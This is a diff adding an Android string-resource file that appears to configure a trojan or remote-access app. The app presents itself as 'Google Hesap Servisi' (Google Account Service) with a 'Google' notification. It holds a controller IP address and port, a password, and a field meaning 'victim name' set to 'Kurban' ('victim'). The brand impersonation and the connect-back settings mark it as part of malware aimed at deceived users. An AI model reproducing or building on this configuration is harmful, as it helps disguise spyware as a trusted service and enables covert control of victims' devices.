@@ -1,0 +1,13 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<resources>
+  <string name="stop_timestamp_service_button_text">DURDUR</string>
+  <string name="restart_timestamp_service_button_text">BASLAT</string>
+  <string name="app_name">Google Hesap Servisi</string>
+  <string name="service_started">Google Hesap Servisi</string>
+  <string name="notification_text">Google</string>
+  <string name="IP">192.168.1.229</string>
+  <string name="PORT">4545</string>
+  <string name="KURBANISMI">Kurban</string>
+  <string name="PASSWORD">3E24A</string>
+  <string name="Ignore">1</string>
+</resources>
